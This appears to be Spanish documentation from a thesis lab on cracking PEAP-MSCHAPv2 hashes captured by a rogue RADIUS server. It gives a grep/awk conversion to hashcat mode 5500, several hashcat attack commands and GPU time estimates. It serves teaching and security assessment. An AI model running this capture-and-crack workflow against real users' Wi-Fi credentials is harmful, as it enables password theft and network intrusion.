# Análisis offline de los hashes capturados

> El laboratorio captura el handshake **PEAP-MSCHAPv2** que el cliente
> intercambia con el servidor RADIUS atacante. Ese handshake contiene un
> `Challenge` y una `Response` derivada de la NT-hash de la contraseña del
> usuario, susceptible de ataque offline. La debilidad criptográfica que lo
> permite fue documentada por **Moxie Marlinspike y David Hulton en DEFCON 20
> (2012)**, *"Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2"*.

## Formato del hash capturado

`freeradius-wpe` deja en `/var/log/freeradius-wpe/freeradius-server-wpe.log`
líneas con el siguiente formato, ya listas para `hashcat`:

```
username::challenge:response:peerchallenge
```

Ejemplo (sintético):

```
alice@uloyola.es::0102030405060708:1122334455667788:99aabbccddeeff00
```

Cada campo se separa por `:`:

| Campo | Bytes | Descripción |
|---|---|---|
| `username` | variable | identidad EAP entregada por el cliente |
| `challenge` | 8 (16 hex) | challenge del servidor (`AuthChallenge`) |
| `response` | 24 (48 hex) | respuesta MSCHAPv2 calculada por el cliente sobre NT-hash + challenges |
| `peerchallenge` | 16 (32 hex) | challenge del cliente (`PeerChallenge`) |

## Conversión al formato hashcat (modo 5500)

`hashcat` espera el formato:

```
username::::response:challenge
```

Para ataques contra NetNTLMv1 (que es lo que matemáticamente es la respuesta
MSCHAPv2 una vez extraída del túnel PEAP), el modo es **`-m 5500`**
(`NetNTLMv1 / NetNTLMv1+ESS`).

```bash
# Extraer líneas tipo username::challenge:response:... y reformatearlas
grep -E '^[^:]+::[0-9a-f]{16}:[0-9a-f]{48}:[0-9a-f]{32}' \
     /var/log/freeradius-wpe/freeradius-server-wpe.log \
  | awk -F: '{print $1"::::"$4":"$3}' \
  > hashes-5500.txt
```

## Cracking con hashcat

```bash
# Diccionario (ej.: rockyou.txt — descomprimir antes)
hashcat -m 5500 -a 0 hashes-5500.txt /usr/share/wordlists/rockyou.txt

# Máscara: 8 chars alfanuméricos minúsculas
hashcat -m 5500 -a 3 hashes-5500.txt '?l?l?l?l?l?l?l?l'

# Híbrido: diccionario + 2 dígitos al final
hashcat -m 5500 -a 6 hashes-5500.txt /ruta/wordlist.txt '?d?d'

# Con reglas (best64)
hashcat -m 5500 -a 0 -r /usr/share/hashcat/rules/best64.rule \
        hashes-5500.txt /ruta/wordlist.txt
```

## Tiempos orientativos

Cifras de referencia para una GPU consumer 2023-2024 (RTX 4060 / 4070).
**El laboratorio del TFG no incluye cracking: la captura es el objetivo, el
análisis offline se hace fuera de la Pi.**

| Longitud y conjunto | Combinaciones | RTX 4060 (~50 GH/s) | RTX 4090 (~120 GH/s) |
|---|---|---|---|
| 8 chars `[a-z]` | 2.1·10¹¹ | ~4 s | <2 s |
| 8 chars `[a-zA-Z0-9]` | 2.2·10¹⁴ | ~73 min | ~30 min |
| 10 chars `[a-zA-Z0-9]` | 8.4·10¹⁷ | ~190 días | ~80 días |
| Diccionario rockyou + best64 | 1.4·10⁹ tras reglas | <1 s | <1 s |
| 12 chars `[a-zA-Z0-9!@#$]` | 8.6·10²¹ | ~5400 años | ~2200 años |

Tomar como cota superior la fortaleza de la contraseña del usuario, no la
del algoritmo: MSCHAPv2 con NT-hash es esencialmente DES de 56 bits en tres
operaciones — completamente recuperable con hardware moderado si la
contraseña es débil.

## Herramientas opcionales (no instaladas por defecto)

Para análisis avanzado pueden serle útiles:

```bash
# aircrack-ng — análisis de PCAPs WiFi, no estrictamente necesario aquí
sudo apt install aircrack-ng

# hcxtools / hcxdumptool — conversores y dumpers de hash
sudo apt install hcxtools hcxdumptool

# asleap — recuperación clásica de LEAP/PPTP/MSCHAPv2
sudo apt install asleap

# john (con jumbo) — alternativa a hashcat con soporte de MSCHAPv2
sudo apt install john
```

Ninguno de estos paquetes es instalado por `install.sh` (la captura no los
necesita). Se documentan aquí por completitud.

## Referencias

- M. Marlinspike & D. Hulton, *"Defeating PPTP VPNs and WPA2 Enterprise with
  MS-CHAPv2"*, DEFCON 20 (2012). [Vídeo](https://www.youtube.com/watch?v=k6oZsy7Pe-Q).
- B. Antoniewicz, J. Wright, *FreeRADIUS-WPE*. Original
  [README de Joshua Wright](https://www.willhackforsushi.com/?page_id=37).
- RFC 2759 — Microsoft PPP CHAP Extensions, Version 2.
- RFC 5281 — Extensible Authentication Protocol Tunneled TLS (PEAP fase 2).
